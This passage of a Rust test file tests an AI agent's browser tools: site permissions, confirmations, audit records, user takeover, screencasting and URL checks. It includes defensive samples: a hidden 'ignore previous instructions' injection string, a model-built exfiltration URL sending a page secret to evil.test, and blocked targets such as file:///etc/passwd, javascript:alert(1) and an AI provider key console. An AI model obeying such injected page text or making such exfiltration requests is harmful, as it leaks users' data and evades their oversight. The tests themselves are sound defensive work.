//! Browser tools against an in-process fake CDP endpoint replaying recorded messages
//! (no real browser). The last test drives a real local Chrome and is `#[ignore]`d.
#![allow(clippy::unwrap_used, clippy::expect_used)] // test code

use std::collections::VecDeque;
use std::sync::atomic::Ordering;
use std::sync::{Arc, Mutex};
use std::time::Duration;

use async_trait::async_trait;
use genie_browser::host::ConfirmDecision;
use genie_browser::session::normalize_url;
use genie_browser::testing::{FakeBackend, FakeCdp, FrameLog, RecordingHost, Reply};
use genie_browser::{Browser, BrowserConfig, CdpClient, SitePolicy, tools};
use genie_protocol::api::browser::{
    BrowserInputParams, BrowserTabParams, InputEvent, NavAction, NavigateParams,
    ScreencastAckParams, ScreencastStartParams, SitePermission, SiteState, StreamIdParams,
    TabNewParams,
};
use genie_protocol::common::{Mode, SessionKind};
use genie_protocol::event::{BrowserAction, SessionEvent, ToolProgress};
use genie_tools::{
    EventSink, PermissionGate, PermissionRequest, Tool, ToolCtx, ToolEnv, ToolError, ToolOutput,
};
use serde_json::{Value, json};
use tokio_util::sync::CancellationToken;
use tokio_util::task::TaskTracker;

const SESSION: &str = "s1";

#[derive(Default)]
struct Gate {
    asked: Mutex<Vec<PermissionRequest>>,
    answers: Mutex<VecDeque<Result<(), ToolError>>>,
}

#[async_trait]
impl PermissionGate for Gate {
    async fn assert(&self, req: PermissionRequest) -> Result<(), ToolError> {
        self.asked.lock().unwrap().push(req);
        self.answers.lock().unwrap().pop_front().unwrap_or(Ok(()))
    }
}

#[derive(Default)]
struct Events(Mutex<Vec<SessionEvent>>);

impl EventSink for Events {
    fn publish(&self, e: SessionEvent) {
        self.0.lock().unwrap().push(e);
    }
    fn progress(&self, _p: ToolProgress) {}
}

impl Events {
    fn actions(&self) -> Vec<BrowserAction> {
        self.0
            .lock()
            .unwrap()
            .iter()
            .filter_map(|e| match e {
                SessionEvent::BrowserAction(a) => Some(a.clone()),
                _ => None,
            })
            .collect()
    }
}

struct Rig {
    fake: FakeCdp,
    browser: Arc<Browser>,
    host: Arc<RecordingHost>,
    gate: Arc<Gate>,
    events: Arc<Events>,
    tools: Vec<Arc<dyn Tool>>,
    mode: Mode,
    turn: String,
    _tasks: TaskTracker,
}

fn fixture() -> Vec<Value> {
    serde_json::from_str(include_str!("fixtures/checkout.json")).unwrap()
}

/// The recorded page load (everything but the post-click entries).
fn recording() -> Value {
    Value::Array(
        fixture()
            .into_iter()
            .filter(|e| e.get("after_click").is_none())
            .collect(),
    )
}

/// The page as recorded after "Place order" was clicked.
fn after_click(fake: &FakeCdp) {
    for e in fixture()
        .into_iter()
        .filter(|e| e.get("after_click").is_some())
    {
        let m = e["method"].as_str().unwrap();
        fake.reset(m);
        fake.ok(m, e["result"].clone());
    }
}

fn rig_with(cfg: BrowserConfig, timeout: Duration, host: RecordingHost) -> Rig {
    let tasks = TaskTracker::new();
    let (fake, wire) = FakeCdp::new(&tasks);
    fake.load(&recording());
    let client = CdpClient::connect_with_timeout(wire, &tasks, timeout);
    let host = Arc::new(host);
    let browser = Browser::new(
        Arc::new(FakeBackend::new(client)),
        host.clone(),
        Arc::new(SitePolicy::new()),
        cfg,
        tasks.clone(),
    );
    let tools = tools(&browser);
    Rig {
        fake,
        browser,
        host,
        gate: Arc::new(Gate::default()),
        events: Arc::new(Events::default()),
        tools,
        mode: Mode::Default,
        turn: "turn1".into(),
        _tasks: tasks,
    }
}

fn rig() -> Rig {
    rig_with(
        BrowserConfig::default(),
        Duration::from_secs(5),
        RecordingHost::default(),
    )
}

impl Rig {
    fn ctx(&self, tool: &str) -> ToolCtx {
        let mut env = ToolEnv::new(SESSION, SessionKind::Chat);
        env.mode = self.mode;
        ToolCtx {
            env: Arc::new(env),
            turn_id: self.turn.clone(),
            call_id: format!("call-{tool}"),
            tool_name: tool.into(),
            cancel: CancellationToken::new(),
            detach: CancellationToken::new(),
            permissions: self.gate.clone(),
            events: self.events.clone(),
        }
    }

    async fn call(&self, tool: &str, input: Value) -> Result<String, ToolError> {
        let t = self
            .tools
            .iter()
            .find(|t| t.name() == tool)
            .unwrap_or_else(|| panic!("no tool {tool}"));
        match t.execute(input, self.ctx(tool)).await? {
            ToolOutput::Text(s) => Ok(s),
            ToolOutput::Json(v) => Ok(v.to_string()),
        }
    }

    fn allow_site(&self, site: &str) {
        self.browser.sites.set(&SitePermission {
            origin: site.into(),
            state: SiteState::Act,
        });
    }
}

async fn eventually(mut f: impl FnMut() -> bool) {
    for _ in 0..100 {
        if f() {
            return;
        }
        tokio::time::sleep(Duration::from_millis(10)).await;
    }
    panic!("condition not reached");
}

#[tokio::test]
async fn tool_set() {
    let r = rig();
    let names: Vec<&str> = r.tools.iter().map(|t| t.name()).collect();
    assert_eq!(names.len(), 19);
    for n in [
        "browser_open",
        "browser_navigate",
        "browser_snapshot",
        "browser_read",
        "browser_find",
        "browser_screenshot",
        "browser_click",
        "browser_type",
        "browser_fill_form",
        "browser_select",
        "browser_press_key",
        "browser_hover",
        "browser_scroll",
        "browser_wait",
        "browser_tabs",
        "browser_upload",
        "browser_downloads",
        "browser_handoff",
    ] {
        assert!(names.contains(&n), "{n}");
    }
    let env = ToolEnv::new(SESSION, SessionKind::Chat);
    let shot = r
        .tools
        .iter()
        .find(|t| t.name() == "browser_screenshot")
        .unwrap();
    assert!(!shot.availability(&env).is_available(), "vision-only");
    let click = r
        .tools
        .iter()
        .find(|t| t.name() == "browser_click")
        .unwrap();
    assert_eq!(click.input_schema()["required"], json!(["ref"]));
}

#[tokio::test]
async fn navigate_snapshot_click_with_site_ask_confirmation_and_audit() {
    let r = rig();
    let out = r
        .call(
            "browser_navigate",
            json!({"url": "https://shop.example/checkout"}),
        )
        .await
        .unwrap();
    assert!(
        out.starts_with("status: ok\ntab: t1\nurl: https://shop.example/checkout\n"),
        "{out}"
    );
    assert!(
        out.contains("<untrusted_web_content origin=\"https://shop.example\">"),
        "{out}"
    );
    assert!(out.contains("(new page)"));
    assert!(out.contains("- button \"Place order\" [ref=e4]"), "{out}");
    // Opacity-0 injection text never reaches the model.
    assert!(!out.contains("ignore previous instructions"));
    // First visit asked: "Allow for this chat · Always allow · Decline".
    {
        let asked = r.gate.asked.lock().unwrap();
        assert_eq!(asked.len(), 1);
        assert_eq!(asked[0].resource.as_deref(), Some("shop.example"));
        assert_eq!(
            asked[0].save_suggestions[0].rule,
            "Browser(site:shop.example)"
        );
    }
    let nav = r.fake.calls_to("Page.navigate");
    assert_eq!(nav[0].session_id.as_deref(), Some("S1"));

    // Reading again on the same site doesn't ask.
    let snap = r
        .call("browser_snapshot", json!({"mode": "full"}))
        .await
        .unwrap();
    assert!(
        snap.contains("text: Your promo code is SUMMER-SECRET-2026"),
        "{snap}"
    );
    assert!(snap.contains("(1 hidden items removed)"));
    assert_eq!(r.gate.asked.lock().unwrap().len(), 1);

    // `act` needs a second ask; the submit in a password form needs a D21 confirmation.
    after_click(&r.fake);
    let out = r.call("browser_click", json!({"ref": "e4"})).await.unwrap();
    assert!(out.starts_with("status: ok"), "{out}");
    assert!(out.contains("~ heading \"Order placed\""), "{out}");
    assert!(out.contains("[disabled]"), "{out}");
    assert_eq!(r.gate.asked.lock().unwrap().len(), 2);
    assert_eq!(r.host.confirm_actions(), vec!["submit"]);
    let confirm = r.host.confirms.lock().unwrap()[0].confirm.clone();
    assert_eq!(confirm.origin, "https://shop.example");
    assert!(confirm.summary.contains("Place order"));
    assert!(confirm.screenshot_blob.is_some());
    let mouse: Vec<String> = r
        .fake
        .calls_to("Input.dispatchMouseEvent")
        .iter()
        .map(|c| c.params["type"].as_str().unwrap().to_string())
        .collect();
    assert_eq!(mouse, ["mouseMoved", "mousePressed", "mouseReleased"]);

    // Audit: one record per call, thumbnail after the act step.
    let a = r.events.actions();
    assert_eq!(a.len(), 3);
    assert_eq!(a[0].tool, "browser_navigate");
    assert_eq!(a[0].decision, "allowed:user");
    assert_eq!(a[0].status, "ok");
    assert_eq!(a[0].origin, "https://shop.example");
    assert!(a[0].thumbnail_ref.is_none());
    assert_eq!(a[2].tool, "browser_click");
    assert_eq!(a[2].decision, "confirmed:user");
    assert!(a[2].thumbnail_ref.is_some());
    // Taint (SA-29) reported for the turn.
    assert!(
        r.host
            .taints
            .lock()
            .unwrap()
            .iter()
            .all(|(t, o)| t == "turn1" && o == "https://shop.example")
    );
}

/// Policy `browser.agentLocalOnly` (ticket 47): outside sites are blocked without an ask,
/// even when the user allowed them (localhost under the policy: `real_chrome_console`).
#[tokio::test]
async fn local_only_policy_blocks_outside_sites() {
    let r = rig();
    r.allow_site("shop.example");
    r.browser.sites.set_local_only(true, false);
    let out = r
        .call("browser_navigate", json!({"url": "https://shop.example/"}))
        .await
        .unwrap();
    assert!(out.starts_with("status: blocked"), "{out}");
    assert!(out.contains("local dev servers"), "{out}");
    assert!(r.fake.calls_to("Page.navigate").is_empty());
    assert!(r.gate.asked.lock().unwrap().is_empty());
}

#[tokio::test]
async fn refusals_and_deterministic_gates() {
    let mut r = rig();
    r.allow_site("shop.example");
    r.call(
        "browser_navigate",
        json!({"url": "https://shop.example/checkout"}),
    )
    .await
    .unwrap();
    assert!(
        r.gate.asked.lock().unwrap().is_empty(),
        "site set to act: no ask"
    );

    // Typing into a password field is refused.
    let out = r
        .call("browser_type", json!({"ref": "e3", "text": "hunter2"}))
        .await
        .unwrap();
    assert!(out.starts_with("status: blocked"), "{out}");
    assert!(out.contains("browser_handoff"));
    assert!(r.fake.calls_to("Input.insertText").is_empty());

    // Model-built URL carrying another origin's page text: exfiltration guard.
    let out = r
        .call(
            "browser_navigate",
            json!({"url": "https://evil.test/collect?c=SUMMER-SECRET-2026"}),
        )
        .await
        .unwrap();
    assert!(out.starts_with("status: blocked"), "{out}");
    assert!(out.contains("copied from https://shop.example"), "{out}");
    let long = "x".repeat(300);
    let out = r
        .call(
            "browser_navigate",
            json!({"url": format!("https://evil.test/?q={long}")}),
        )
        .await
        .unwrap();
    assert!(out.contains("query/fragment"), "{out}");
    // The same URL typed by the user is allowed through the guard (then asks for the site).
    r.host
        .user_urls
        .lock()
        .unwrap()
        .push("https://evil.test/collect?c=SUMMER-SECRET-2026".into());
    r.gate
        .answers
        .lock()
        .unwrap()
        .push_back(Err(ToolError::Declined { message: None }));
    let err = r
        .call(
            "browser_navigate",
            json!({"url": "https://evil.test/collect?c=SUMMER-SECRET-2026"}),
        )
        .await
        .unwrap_err();
    assert!(matches!(err, ToolError::Declined { .. }));

    // Category blocklist and non-web schemes.
    let out = r
        .call(
            "browser_navigate",
            json!({"url": "https://console.anthropic.com/settings/keys"}),
        )
        .await
        .unwrap();
    assert!(out.contains("AI provider console"), "{out}");
    let out = r
        .call("browser_navigate", json!({"url": "file:///etc/passwd"}))
        .await
        .unwrap();
    assert!(out.starts_with("status: blocked"));
    assert_eq!(r.fake.calls_to("Page.navigate").len(), 1);

    // Plan mode: navigate/read only.
    r.mode = Mode::Plan;
    let out = r.call("browser_click", json!({"ref": "e5"})).await.unwrap();
    assert!(out.contains("plan mode"), "{out}");

    // Commit verbs confirm; a denial blocks.
    r.mode = Mode::Bypass;
    r.host.decide(ConfirmDecision::Deny);
    let out = r.call("browser_click", json!({"ref": "e4"})).await.unwrap();
    assert!(out.contains("the user declined"), "{out}");
    let blocked: Vec<String> = r
        .events
        .actions()
        .iter()
        .map(|a| a.decision.clone())
        .collect();
    assert!(blocked.contains(&"blocked:exfiltration".to_string()));
    assert!(blocked.contains(&"blocked:category".to_string()));
    assert!(blocked.contains(&"blocked:mode".to_string()));
    assert!(blocked.contains(&"denied:user".to_string()));
}

#[tokio::test]
async fn takeover_handback_and_step_caps() {
    let cfg = BrowserConfig {
        max_steps: 2,
        ..BrowserConfig::default()
    };
    let r = rig_with(cfg, Duration::from_secs(5), RecordingHost::default());
    r.allow_site("shop.example");
    r.call(
        "browser_navigate",
        json!({"url": "https://shop.example/checkout"}),
    )
    .await
    .unwrap();

    r.browser.takeover(SESSION);
    let out = r.call("browser_snapshot", json!({})).await.unwrap();
    assert!(out.starts_with("status: user_in_control"), "{out}");

    r.browser.handback(SESSION);
    let out = r.call("browser_hover", json!({"ref": "e2"})).await.unwrap();
    assert!(out.contains("note: the user acted in the browser"), "{out}");
    // A fresh outline rather than a diff.
    assert!(out.contains("(new page)"), "{out}");

    // Third step of the turn: check in with the user; "deny" stops browsing.
    r.host.decide(ConfirmDecision::Deny);
    let out = r.call("browser_snapshot", json!({})).await.unwrap();
    assert!(out.starts_with("status: blocked"), "{out}");
    assert_eq!(r.host.confirm_actions(), vec!["continue"]);

    // Handoff from the agent.
    let mut r2 = r;
    r2.turn = "turn2".into();
    let out = r2
        .call("browser_handoff", json!({"reason": "log in"}))
        .await
        .unwrap();
    assert!(out.starts_with("status: user_in_control"));
    assert_eq!(r2.host.handoffs.lock().unwrap().as_slice(), ["log in"]);
    let out = r2.call("browser_snapshot", json!({})).await.unwrap();
    assert!(out.starts_with("status: user_in_control"));
}

#[tokio::test]
async fn lost_result_is_unknown_and_not_retried() {
    let r = rig_with(
        BrowserConfig::default(),
        Duration::from_millis(300),
        RecordingHost::default(),
    );
    r.allow_site("shop.example");
    r.fake.reset("Page.navigate");
    r.fake.on("Page.navigate", Reply::dropped());
    let out = r
        .call(
            "browser_navigate",
            json!({"url": "https://shop.example/checkout"}),
        )
        .await
        .unwrap();
    assert!(out.starts_with("status: unknown"), "{out}");
    assert!(out.contains("not retried"));
    assert_eq!(r.fake.calls_to("Page.navigate").len(), 1);
    assert_eq!(r.events.actions()[0].status, "unknown");
}

#[tokio::test]
async fn downloads_need_confirmation() {
    let dir = tempfile::tempdir().unwrap();
    let cfg = BrowserConfig {
        downloads_dir: Some(dir.path().to_path_buf()),
        ..BrowserConfig::default()
    };
    let r = rig_with(cfg, Duration::from_secs(5), RecordingHost::default());
    r.allow_site("shop.example");
    r.call(
        "browser_navigate",
        json!({"url": "https://shop.example/checkout"}),
    )
    .await
    .unwrap();
    let set = r.fake.calls_to("Browser.setDownloadBehavior");
    assert_eq!(set[0].params["behavior"], "allowAndName");

    r.fake.on(
        "Input.dispatchMouseEvent",
        Reply::ok(json!({})).with_events(vec![json!({
            "method": "Browser.downloadWillBegin",
            "params": {"frameId": "T1", "guid": "g1", "url": "https://shop.example/invoice.pdf", "suggestedFilename": "invoice.pdf"}
        })]),
    );
    let out = r.call("browser_click", json!({"ref": "e5"})).await.unwrap();
    assert!(out.starts_with("status: ok"), "{out}");
    assert_eq!(r.host.confirm_actions(), vec!["download"]);
    assert_eq!(
        r.fake.calls_to("Browser.cancelDownload")[0].params["guid"],
        "g1"
    );
    let nav = r.fake.calls_to("Page.navigate");
    assert_eq!(
        nav.last().unwrap().params["url"],
        "https://shop.example/invoice.pdf"
    );
    let out = r.call("browser_downloads", json!({})).await.unwrap();
    assert!(out.contains("invoice.pdf (g1): canceled"), "{out}");
}

#[tokio::test]
async fn read_find_tabs_and_form_tools() {
    let r = rig();
    r.allow_site("shop.example");
    r.call(
        "browser_open",
        json!({"url": "https://shop.example/checkout"}),
    )
    .await
    .unwrap();
    let md = r.call("browser_read", json!({})).await.unwrap();
    assert!(md.contains("# Checkout"), "{md}");
    assert!(md.contains("[Help](https://shop.example/help)"));
    let f = r
        .call("browser_find", json!({"query": "promo"}))
        .await
        .unwrap();
    assert!(f.contains("SUMMER-SECRET"), "{f}");

    r.fake.ok(
        "Runtime.callFunctionOn",
        json!({"result": {"type": "undefined"}}),
    );
    let out = r
        .call(
            "browser_type",
            json!({"ref": "e2", "text": "a@b.c", "submit": true}),
        )
        .await
        .unwrap();
    assert!(out.starts_with("status: ok"), "{out}");
    assert_eq!(
        r.fake.calls_to("Input.insertText")[0].params["text"],
        "a@b.c"
    );
    // Enter in a form with a password field confirms first.
    assert_eq!(r.host.confirm_actions(), vec!["submit"]);
    let keys: Vec<String> = r
        .fake
        .calls_to("Input.dispatchKeyEvent")
        .iter()
        .map(|c| c.params["type"].as_str().unwrap().to_string())
        .collect();
    assert_eq!(keys, ["keyDown", "keyUp"]);

    let err = r
        .call(
            "browser_fill_form",
            json!({"fields": [{"ref": "e2", "value": "x"}, {"ref": "e3", "value": "pw"}]}),
        )
        .await
        .unwrap();
    assert!(err.starts_with("status: blocked"), "{err}");

    let out = r
        .call("browser_tabs", json!({"action": "list"}))
        .await
        .unwrap();
    assert!(
        out.contains("- t1 (active): Shop — https://shop.example/checkout"),
        "{out}"
    );
    let err = r
        .call("browser_tabs", json!({"action": "switch", "tab_id": "t9"}))
        .await
        .unwrap_err();
    assert!(matches!(err, ToolError::InvalidInput { .. }));
    let err = r
        .call("browser_click", json!({"ref": "e99"}))
        .await
        .unwrap_err();
    assert!(err.to_string().contains("unknown ref"));
}

#[tokio::test]
async fn screenshot_with_vision() {
    let host = RecordingHost {
        vision: true,
        ..RecordingHost::default()
    };
    let r = rig_with(BrowserConfig::default(), Duration::from_secs(5), host);
    r.allow_site("shop.example");
    r.call(
        "browser_navigate",
        json!({"url": "https://shop.example/checkout"}),
    )
    .await
    .unwrap();
    let env = ToolEnv::new(SESSION, SessionKind::Chat);
    let shot = r
        .tools
        .iter()
        .find(|t| t.name() == "browser_screenshot")
        .unwrap();
    assert!(shot.availability(&env).is_available());
    let out = r.call("browser_screenshot", json!({})).await.unwrap();
    assert!(out.contains("note: image: img1 (jpeg"), "{out}");
}

#[tokio::test]
async fn screencast_flow_control_and_input() {
    let r = rig();
    r.allow_site("shop.example");
    r.call("browser_open", json!({})).await.unwrap();
    let log = Arc::new(FrameLog::default());
    let sc = r
        .browser
        .screencast_start(
            &ScreencastStartParams {
                session_id: SESSION.into(),
                tab_id: None,
                max_width: 1280,
                max_height: 800,
                quality: 60,
            },
            log.clone(),
        )
        .await
        .unwrap();
    let start = r.fake.calls_to("Page.startScreencast");
    assert_eq!(start[0].session_id.as_deref(), Some("S1"));
    assert_eq!(start[0].params["quality"], 60);

    let frame = |n: i64| {
        json!({"method": "Page.screencastFrame", "sessionId": "S1", "params": {
            "data": "/9j/4AAQ", "sessionId": n,
            "metadata": {"deviceWidth": 1280, "deviceHeight": 800, "pageScaleFactor": 1, "offsetTop": 0, "scrollOffsetX": 0, "scrollOffsetY": 0, "timestamp": 1795000000.0}
        }})
    };
    let acks = |f: &FakeCdp| f.calls_to("Page.screencastFrameAck").len();
    r.fake.emit(frame(1));
    eventually(|| log.0.lock().unwrap().len() == 1).await;
    eventually(|| acks(&r.fake) == 1).await;
    // Client hasn't acked: frames 2 and 3 are held, Chrome isn't acked.
    r.fake.emit(frame(2));
    r.fake.emit(frame(3));
    tokio::time::sleep(Duration::from_millis(50)).await;
    assert_eq!(log.0.lock().unwrap().len(), 1);
    assert_eq!(acks(&r.fake), 1);
    // The ack releases the newest frame and Chrome's ack.
    r.browser
        .screencast_ack(&ScreencastAckParams {
            stream_id: sc.stream_id.clone(),
            frame_seq: 1,
        })
        .unwrap();
    {
        let frames = log.0.lock().unwrap();
        assert_eq!(frames.len(), 2);
        assert_eq!(frames[1].frame_seq, 3);
        assert_eq!(frames[1].stream_id, sc.stream_id);
        assert_eq!(frames[1].tab_id, "t1");
        assert_eq!((frames[1].w, frames[1].h), (1280, 800));
        assert!(frames[1].ts.starts_with("2026-11-18T"));
    }
    eventually(|| acks(&r.fake) == 2).await;
    assert_eq!(
        r.fake.calls_to("Page.screencastFrameAck")[1].params["sessionId"],
        3
    );

    // Take-over input: forwarded, and the agent pauses.
    r.browser
        .input(&BrowserInputParams {
            session_id: SESSION.into(),
            tab_id: "t1".into(),
            event: InputEvent::InsertText { text: "hi".into() },
        })
        .await
        .unwrap();
    eventually(|| !r.fake.calls_to("Input.insertText").is_empty()).await;
    assert_eq!(
        r.fake.calls_to("Input.insertText")[0].session_id.as_deref(),
        Some("S1")
    );
    let out = r.call("browser_snapshot", json!({})).await.unwrap();
    assert!(out.starts_with("status: user_in_control"));

    r.browser
        .screencast_stop(&StreamIdParams {
            stream_id: sc.stream_id,
        })
        .await;
    assert_eq!(r.fake.calls_to("Page.stopScreencast").len(), 1);
}

fn cast_params(tab_id: Option<&str>) -> ScreencastStartParams {
    ScreencastStartParams {
        session_id: SESSION.into(),
        tab_id: tab_id.map(String::from),
        max_width: 1280,
        max_height: 800,
        quality: 60,
    }
}

fn cast_frame(cdp_session: &str, n: i64) -> Value {
    json!({"method": "Page.screencastFrame", "sessionId": cdp_session, "params": {
        "data": "/9j/4AAQ", "sessionId": n,
        "metadata": {"deviceWidth": 1280, "deviceHeight": 800, "pageScaleFactor": 1, "offsetTop": 0, "scrollOffsetX": 0, "scrollOffsetY": 0, "timestamp": 1795000000.0}
    }})
}

/// The Browser tab opens before the agent browses (the panel's normal case): the stream
/// waits without launching the browser, attaches to the first tab, follows a new active
/// tab, and falls back when that tab closes.
#[tokio::test]
async fn screencast_waits_for_a_tab_and_follows_the_active_tab() {
    let r = rig();
    r.allow_site("shop.example");
    let log = Arc::new(FrameLog::default());
    let sc = r
        .browser
        .screencast_start(&cast_params(None), log.clone())
        .await
        .unwrap();
    assert!(r.fake.calls_to("Page.startScreencast").is_empty());
    assert!(
        r.fake.calls().is_empty(),
        "no browser launch for an idle panel"
    );
    // Acks of a waiting stream are fine.
    r.browser
        .screencast_ack(&ScreencastAckParams {
            stream_id: sc.stream_id.clone(),
            frame_seq: 0,
        })
        .unwrap();

    // The agent opens a tab: the stream attaches to it.
    r.call("browser_open", json!({})).await.unwrap();
    eventually(|| r.fake.calls_to("Page.startScreencast").len() == 1).await;
    assert_eq!(
        r.fake.calls_to("Page.startScreencast")[0]
            .session_id
            .as_deref(),
        Some("S1")
    );
    r.fake.emit(cast_frame("S1", 1));
    eventually(|| log.0.lock().unwrap().len() == 1).await;
    assert_eq!(log.0.lock().unwrap()[0].tab_id, "t1");
    r.browser
        .screencast_ack(&ScreencastAckParams {
            stream_id: sc.stream_id.clone(),
            frame_seq: 1,
        })
        .unwrap();

    // A new tab becomes active: the stream moves there.
    r.fake.reset("Target.createTarget");
    r.fake.ok("Target.createTarget", json!({"targetId": "T2"}));
    r.fake.reset("Target.attachToTarget");
    r.fake
        .ok("Target.attachToTarget", json!({"sessionId": "S2"}));
    let out = r
        .call("browser_tabs", json!({"action": "new"}))
        .await
        .unwrap();
    assert!(out.contains("t2"), "{out}");
    eventually(|| {
        r.fake
            .calls_to("Page.startScreencast")
            .iter()
            .any(|c| c.session_id.as_deref() == Some("S2"))
    })
    .await;
    eventually(|| {
        r.fake
            .calls_to("Page.stopScreencast")
            .iter()
            .any(|c| c.session_id.as_deref() == Some("S1"))
    })
    .await;
    r.fake.emit(cast_frame("S2", 1));
    eventually(|| log.0.lock().unwrap().iter().any(|f| f.tab_id == "t2")).await;

    // Closing it falls back to the first tab.
    r.call("browser_tabs", json!({"action": "close", "tab_id": "t2"}))
        .await
        .unwrap();
    eventually(|| {
        r.fake
            .calls_to("Page.startScreencast")
            .iter()
            .filter(|c| c.session_id.as_deref() == Some("S1"))
            .count()
            == 2
    })
    .await;

    r.browser
        .screencast_stop(&StreamIdParams {
            stream_id: sc.stream_id,
        })
        .await;
    assert!(r.browser.streams_of(SESSION).is_empty());
}

/// A stream that joins a running cast gets the newest frame at once (a static page sends
/// no new frames), and Stop leaves the live view running.
#[tokio::test]
async fn late_stream_gets_latest_frame_and_stop_keeps_the_view() {
    let r = rig();
    r.allow_site("shop.example");
    r.call("browser_open", json!({})).await.unwrap();
    let a = Arc::new(FrameLog::default());
    r.browser
        .screencast_start(&cast_params(None), a.clone())
        .await
        .unwrap();
    r.fake.emit(cast_frame("S1", 1));
    eventually(|| a.0.lock().unwrap().len() == 1).await;
    let b = Arc::new(FrameLog::default());
    r.browser
        .screencast_start(&cast_params(Some("t1")), b.clone())
        .await
        .unwrap();
    assert_eq!(b.0.lock().unwrap().len(), 1);
    assert_eq!(r.fake.calls_to("Page.startScreencast").len(), 1);

    r.browser.stop(SESSION).await;
    assert_eq!(r.browser.streams_of(SESSION).len(), 2);
    assert!(r.fake.calls_to("Page.stopScreencast").is_empty());
    // Stop doesn't hand the browser to the user: the agent can browse in the next turn.
    let out = r.call("browser_snapshot", json!({})).await.unwrap();
    assert!(!out.starts_with("status: user_in_control"), "{out}");
}

/// The banner learns "agent" from the first action, and a handoff keeps its reason.
#[tokio::test]
async fn banner_reports_agent_and_handoff() {
    use genie_browser::Control;
    let r = rig();
    r.allow_site("shop.example");
    r.call("browser_open", json!({})).await.unwrap();
    r.call("browser_snapshot", json!({})).await.unwrap();
    assert_eq!(r.host.controls.lock().unwrap().as_slice(), [Control::Agent]);
    r.call("browser_handoff", json!({"reason": "solve the CAPTCHA"}))
        .await
        .unwrap();
    assert_eq!(
        r.host.handoffs.lock().unwrap().as_slice(),
        ["solve the CAPTCHA"]
    );
    // No `user` event after the handoff would overwrite its reason.
    assert_eq!(r.host.controls.lock().unwrap().as_slice(), [Control::Agent]);
    r.browser.handback(SESSION);
    assert_eq!(
        r.host.controls.lock().unwrap().as_slice(),
        [Control::Agent, Control::Agent]
    );
}

/// Take-over extras (SA-24): copy only while the user is in control; file pickers are
/// intercepted on every tab and only the user's are sent to the client and answered.
#[tokio::test]
async fn copy_and_file_chooser_during_takeover() {
    use genie_protocol::api::browser::FileChooserAnswerParams;
    let r = rig();
    r.allow_site("shop.example");
    r.call("browser_open", json!({})).await.unwrap();
    assert!(
        r.fake
            .calls_to("Page.setInterceptFileChooserDialog")
            .iter()
            .any(|c| c.session_id.as_deref() == Some("S1") && c.params["enabled"] == true)
    );

    // Copy.
    assert!(r.browser.copy_selection(SESSION, "t1").await.is_err());
    r.browser.takeover(SESSION);
    r.fake.reset("Runtime.evaluate");
    r.fake.ok(
        "Runtime.evaluate",
        json!({"result": {"type": "string", "value": "picked text"}}),
    );
    assert_eq!(
        r.browser.copy_selection(SESSION, "t1").await.unwrap(),
        "picked text"
    );

    // A picker opened while the agent drives is ignored.
    let opened = |mode: &str| {
        json!({"method": "Page.fileChooserOpened", "sessionId": "S1",
               "params": {"frameId": "T1", "mode": mode, "backendNodeId": 42}})
    };
    r.browser.handback(SESSION);
    r.fake.emit(opened("selectSingle"));
    tokio::time::sleep(Duration::from_millis(50)).await;
    assert!(r.host.choosers.lock().unwrap().is_empty());

    // The user's picker goes to the client and is answered with real files only.
    r.browser.takeover(SESSION);
    r.fake.emit(opened("selectMultiple"));
    eventually(|| r.host.choosers.lock().unwrap().len() == 1).await;
    let ch = r.host.choosers.lock().unwrap()[0].clone();
    assert!(ch.multiple);
    assert_eq!(ch.tab_id, "t1");
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("cv.pdf");
    std::fs::write(&file, b"%PDF").unwrap();
    let answer = |files: Vec<String>| FileChooserAnswerParams {
        session_id: SESSION.into(),
        chooser_id: ch.chooser_id.clone(),
        files,
    };
    r.browser
        .file_chooser_answer(&answer(vec![file.to_string_lossy().into_owned()]))
        .await
        .unwrap();
    let set = r.fake.calls_to("DOM.setFileInputFiles");
    assert_eq!(set.len(), 1);
    assert_eq!(set[0].session_id.as_deref(), Some("S1"));
    assert_eq!(set[0].params["backendNodeId"], 42);
    // Answered once; unknown ids and non-files are refused.
    assert!(
        r.browser
            .file_chooser_answer(&answer(vec![]))
            .await
            .is_err()
    );
    r.fake.emit(opened("selectSingle"));
    eventually(|| r.host.choosers.lock().unwrap().len() == 2).await;
    let ch2 = r.host.choosers.lock().unwrap()[1].clone();
    let err = r
        .browser
        .file_chooser_answer(&FileChooserAnswerParams {
            session_id: SESSION.into(),
            chooser_id: ch2.chooser_id,
            files: vec!["/definitely/not/here".into()],
        })
        .await;
    assert!(err.is_err());
    assert_eq!(r.fake.calls_to("DOM.setFileInputFiles").len(), 1);
}

#[test]
fn address_bar_input() {
    let n = |s: &str| normalize_url(s);
    assert_eq!(
        n("https://a.example/x").as_deref(),
        Some("https://a.example/x")
    );
    assert_eq!(
        n("  example.com/path?q=1 ").as_deref(),
        Some("https://example.com/path?q=1")
    );
    assert_eq!(
        n("example.com:8443").as_deref(),
        Some("https://example.com:8443")
    );
    assert_eq!(
        n("localhost:3000").as_deref(),
        Some("http://localhost:3000")
    );
    assert_eq!(
        n("127.0.0.1:5173/app").as_deref(),
        Some("http://127.0.0.1:5173/app")
    );
    assert_eq!(n("api.localhost").as_deref(), Some("http://api.localhost"));
    assert_eq!(n("about:blank").as_deref(), Some("about:blank"));
    for bad in [
        "",
        "hello world",
        "javascript:alert(1)",
        "javascript:a.b",
        "file:///etc/passwd",
        "chrome://settings",
        "mailto:a@b.example",
        "intranet",
        ".example",
    ] {
        assert_eq!(n(bad), None, "{bad}");
    }
}

fn nav(url: Option<&str>, action: Option<NavAction>) -> NavigateParams {
    NavigateParams {
        session_id: SESSION.into(),
        tab_id: None,
        url: url.map(String::from),
        action,
    }
}

/// The user's own browsing (t47): no site asks, no "user in control" while the agent is
/// idle (its next action gets the "user acted" note), tabs, history and pop-ups.
#[tokio::test]
async fn user_browsing_needs_no_prompts() {
    let r = rig();
    r.host.idle.store(true, Ordering::SeqCst);

    // The first address opens a tab straight at it.
    let t = r
        .browser
        .navigate(&nav(Some("shop.example/checkout"), None))
        .await
        .unwrap();
    assert_eq!(t.tab_id, "t1");
    assert_eq!(
        r.fake
            .calls_to("Target.createTarget")
            .last()
            .unwrap()
            .params["url"],
        "https://shop.example/checkout"
    );
    assert!(r.fake.calls_to("Page.navigate").is_empty());
    assert!(r.host.confirms.lock().unwrap().is_empty());
    assert!(r.gate.asked.lock().unwrap().is_empty());
    assert!(
        r.host.controls.lock().unwrap().is_empty(),
        "idle: not 'user in control'"
    );

    // The address bar on the open tab.
    r.browser
        .navigate(&nav(Some("localhost:3000"), None))
        .await
        .unwrap();
    let go = r.fake.calls_to("Page.navigate");
